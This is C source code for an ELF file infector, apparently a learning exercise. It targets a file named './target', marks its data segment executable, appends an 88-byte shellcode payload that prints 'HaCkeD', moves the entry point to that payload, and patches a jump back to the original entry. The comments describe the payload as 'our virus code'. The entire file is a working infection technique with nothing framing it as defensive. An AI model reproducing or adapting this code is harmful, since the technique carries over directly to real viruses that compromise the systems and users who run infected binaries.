#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>

char code2[88] = {
	0x90,0x90,0x90,0x90,0x90,0x90,0x50,0x53,0x51,0x52,
	0x56,0x57,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,
	0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0xb8,
	0x48,0x61,0x43,0x6b,0x65,0x44,0x0a,0x03,0x50,0x48,
	0x8d,0x34,0x24,0xb8,0x01,0x00,0x00,0x00,0xbf,0x01,
	0x00,0x00,0x00,0xba,0x07,0x00,0x00,0x00,0x0f,0x05,
	0x58,0x41,0x5f,0x41,0x5e,0x41,0x5d,0x41,0x5c,0x41,
	0x5b,0x41,0x5a,0x41,0x59,0x41,0x58,0x5f,0x5e,0x5a,
	0x59,0x5b,0x58,0xe9
};

int codeLen = 88;

void	debug_code() {
	int i = 0;
	while (i < codeLen) {
		printf("%02x ", ((uint8_t *)&code2)[i]);
		i++;
	}
	printf("\n");
	return;
}

void	infect_file(char *name) {
	int		fd = open(name, O_RDWR);
	if (fd == -1) {
		printf("Can't open file: %s\n", name);
		return ;
	}
	char	buffer[4096];
	char	buffer2[8192];

	// DEFINING HEADERS FOR PARSING FILE
	Elf64_Ehdr *Ehdr = NULL;
	Elf64_Phdr *Phdr = NULL;
	Elf64_Shdr *Shdr = NULL;

	// READ ENTRY HEADER
	read(fd, buffer, sizeof(Elf64_Ehdr));
	Ehdr = (Elf64_Ehdr *)buffer;
	printf("Host entry point: %lx\n", Ehdr->e_entry);

	// SAVE SOME INFORMATIONS FOR LATER
	Elf64_Off shdr_start = Ehdr->e_shoff;
	Elf64_Off phdr_start = Ehdr->e_phoff;
	uint16_t shnum = Ehdr->e_shnum;
	uint16_t phnum = Ehdr->e_phnum;
	uint64_t host_entry = Ehdr->e_entry;

	// PARSE SEGMENTS
	lseek(fd, phdr_start, SEEK_SET);
	read(fd, buffer, sizeof(Elf64_Phdr) * phnum);

	int counter = 0;
	uint64_t current_offset = 0;
	while (counter < phnum) {
		Phdr = (Elf64_Phdr *)buffer + counter;
		current_offset = phdr_start + ((uint64_t)Phdr - (uint64_t)&buffer);
		//printf("Found segment number: %d at file offset: 0x%lx\n", i, Phdr->p_offset);
		// FOUND DATA SEGMENT
		if (Phdr->p_type == 1 && Phdr->p_flags == 6) {
			// printf("Found data segment at offset: 0x%lx\n", Phdr->p_offset);
			uint64_t injected_offset = Phdr->p_offset + Phdr->p_filesz;
			uint64_t injected_address = Phdr->p_vaddr + Phdr->p_memsz;

			// SET EXECUTE FLAG FOR DATA SEG
			size_t flag_offset = 4 + current_offset;
			lseek(fd, flag_offset, SEEK_SET);
			uint32_t RWE = 0x00000007;
			write(fd, &RWE, sizeof(uint32_t));

			// SET ENTRY POINT AT END OF DATA SEG
			lseek(fd, 0x18, SEEK_SET);
			printf("Set entry point: %lx\n", injected_address);
			write(fd, &injected_address, sizeof(uint64_t));

			// REDIRECT OUR VIRUS CODE TO HOST ENTRY POINT
			void *addr = &code2;
			addr += codeLen - 4;
			uint32_t difference = injected_address - host_entry;
			// printf("Difference = %x - %x = %x\n", injected_address, host_entry, difference);
			difference += codeLen;
			difference *= -1; // FOR NEGATIVE REL JUMP
			*(uint32_t *)addr = difference;
			// debug_code();
			int bss_len = Phdr->p_memsz - Phdr->p_filesz;

			// INCREASE DATA SEG SIZE (MEMSZ & FILESZ BY SIZE OF OUR VIRUS)
			Phdr->p_filesz += codeLen + bss_len; // + BSS LEN BECAUSE WE WRITE BSS IN FILE
			Phdr->p_memsz += codeLen;
			lseek(fd, flag_offset + 4 + 8 + 8 + 8, SEEK_SET);
			write(fd, &Phdr->p_filesz, sizeof(uint64_t));
			write(fd, &Phdr->p_memsz, sizeof(uint64_t));

			// APPEND BSS IN FILE AND APPEND CODE AT END DATA SEGMENT
			lseek(fd, injected_offset, SEEK_SET);
			int end = read(fd, &buffer2, 8192); // SAVING CODE POST injected_offset SO WE CAN REWRITE IT AFTER INSERTION
			lseek(fd, injected_offset, SEEK_SET);
			int j = 0 - bss_len;
			while (j < codeLen) {
				if (j < 0)
					write(fd, "\0", 1); // WRITE BSS SECTION IN FILE
				else
					write(fd, &code2[j], 1); // WRITE INJECTED CODE AFTER BSS
				j++;
			}
			write(fd, buffer2, end); // WRITE OUR SAVED CODE POST INJECTION
			printf("Injected %d hex values at offset: 0x%lx\n", j + bss_len, injected_offset);
			printf("Writing %d bytes to reach EOF\n", end);

			// INCREMENT SECTION OFFSET BY CODE LEN
			codeLen += bss_len;
			int tmp2 = shdr_start + codeLen;
			lseek(fd, 0x28, SEEK_SET);
			write(fd, &tmp2, sizeof(uint32_t));
		}
		counter++;
	}

	// PARSE SECTIONS TO INCREASE .bss SECTION OFFSET BY THE SIZE OF VIRUS
	shdr_start += codeLen; // GET OUR SHDR START POST INJECTION
	lseek(fd, shdr_start, SEEK_SET);
	read(fd, buffer, sizeof(Elf64_Shdr) * shnum);

	counter = 0;
	int found = 0;
	while (counter < shnum) {
		Shdr = (Elf64_Shdr *)buffer + counter;
		current_offset = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
		// printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
		if (found) {
			// INCREMENTING NEXT SECTIONS BY CODELEN + BSS SIZE
			// printf("Incrementing section offset\n");
			Shdr->sh_addr += codeLen;
			lseek(fd, current_offset + 4 + 4 + 8, SEEK_SET);
			write(fd, &Shdr->sh_addr, sizeof(uint64_t));
			Shdr->sh_offset += codeLen;
			write(fd, &Shdr->sh_offset, sizeof(uint64_t));
		}
		if (Shdr->sh_type == SHT_NOBITS) // FOUND BSS SECTION
			found = 1;
		counter++;
	}
	close(fd);
}

int		main(int argc, char **argv) {
	infect_file("./target");
	return 0;
}
